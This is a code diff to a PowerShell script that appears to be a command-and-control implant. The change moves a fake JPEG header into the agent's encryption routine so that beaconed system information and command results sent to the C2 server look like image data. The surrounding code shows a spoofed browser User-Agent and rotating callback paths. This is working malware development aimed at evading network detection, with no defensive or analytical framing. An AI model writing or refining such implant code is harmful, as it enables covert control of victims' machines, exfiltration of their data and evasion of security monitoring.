@@ -57,6 +57,8 @@ function Get-StableClientId {
 }
 
 # Function to encrypt data for C2 communication
+
+# Function to encrypt data for C2 communication with binary JPEG header
 function Encrypt-Data {
     param([string]$PlainText)
     
@@ -100,8 +102,14 @@ function Encrypt-Data {
     [Array]::Copy($iv, 0, $result, 0, $iv.Length)
     [Array]::Copy($encryptedBytes, 0, $result, $iv.Length, $encryptedBytes.Length)
     
+    # Add JPEG header bytes (0xFF, 0xD8, 0xFF) at binary level before base64 encoding
+    $jpegHeader = [byte[]]@(0xFF, 0xD8, 0xFF)
+    $withHeader = New-Object byte[] ($jpegHeader.Length + $result.Length)
+    [Array]::Copy($jpegHeader, 0, $withHeader, 0, $jpegHeader.Length)
+    [Array]::Copy($result, 0, $withHeader, $jpegHeader.Length, $result.Length)
+    
     # Return Base64
-    return [System.Convert]::ToBase64String($result)
+    return [System.Convert]::ToBase64String($withHeader)
 }
 
 # Function to decrypt data from C2 communication
@@ -234,7 +242,6 @@ function Get-SystemIdentification {
 }
 
 # Function to process commands from the C2 server
-# Function to process commands from the C2 server
 function Process-Commands {
     param([array]$Commands)
     
@@ -294,12 +301,8 @@ function Process-Commands {
                         # On subsequent retries, try with encryption
                         else {
                             $encryptedResult = Encrypt-Data -PlainText $resultJson
-                            
-                            # Add JPEG header to disguise the data
-                            $jpegHeader = "0xFFD8FF"
-                            
                             $encryptedObj = @{
-                                data = "$jpegHeader$encryptedResult"
+                                data = $encryptedResult
                                 client_id = $global:clientId
                             }
                             $encryptedJson = ConvertTo-Json -InputObject $encryptedObj -Compress
@@ -366,9 +369,6 @@ function Process-Commands {
             $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
             $encryptedResult = Encrypt-Data -PlainText $resultJson
             
-            # Add JPEG header to disguise the data - AFTER encryption
-            $jpegHeader = "0xFFD8FF"
-            
             # Get current command result path
             $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
             $resultUrl = "http://$serverAddress$cmdResultPath"
@@ -379,9 +379,9 @@ function Process-Commands {
             $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
             $resultClient.Headers.Add("Content-Type", "application/json")
             
-            # Create payload with encrypted data and client ID in plain text
+            # Create payload with encrypted data (JPEG header is now added inside Encrypt-Data)
             $payload = @{
-                data = "$jpegHeader$encryptedResult"
+                data = $encryptedResult
                 client_id = $global:clientId
             }
             $payloadJson = ConvertTo-Json -InputObject $payload -Compress
@@ -406,9 +406,6 @@ function Process-Commands {
             $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
             $encryptedResult = Encrypt-Data -PlainText $resultJson
             
-            # Add JPEG header to disguise the data - AFTER encryption
-            $jpegHeader = "0xFFD8FF"
-            
             # Get current command result path
             $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
             $resultUrl = "http://$serverAddress$cmdResultPath"
@@ -419,9 +416,9 @@ function Process-Commands {
             $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
             $resultClient.Headers.Add("Content-Type", "application/json")
             
-            # Create payload with encrypted data and client ID in plain text
+            # Create payload with encrypted data (JPEG header is now added inside Encrypt-Data)
             $payload = @{
-                data = "$jpegHeader$encryptedResult"
+                data = $encryptedResult
                 client_id = $global:clientId
             }
             $payloadJson = ConvertTo-Json -InputObject $payload -Compress
@@ -607,14 +604,14 @@ function Start-AgentLoop {
             # Prepare the system info data
             $systemInfoRaw = Get-SystemIdentification
             
-            # If we have an encryption key, encrypt the data
+            # For first contact, don't encrypt; for established contacts, encrypt with JPEG header
             if ($null -ne $global:encryptionKey) {
+                # The Encrypt-Data function now adds the JPEG header at binary level
                 $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfoRaw
-                # Add JPEG header to the encrypted data
-                $systemInfoWithHeader = "0xFFD8FF$encryptedSystemInfo"
+                $systemInfoToSend = $encryptedSystemInfo
             } else {
                 # For first contact, don't encrypt or add header
-                $systemInfoWithHeader = $systemInfoRaw
+                $systemInfoToSend = $systemInfoRaw
             }
             
             # Add this before the beacon payload creation
@@ -622,7 +619,7 @@ function Start-AgentLoop {
             # Prepare the beacon payload - include client ID in plain text
             $beaconPayload = @{
                 client_id = $global:clientId
-                data = $systemInfoWithHeader
+                data = $systemInfoToSend
                 rotation_id = if ($global:pathRotationEnabled) { $global:currentRotationId } else { 0 }
             }
             $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
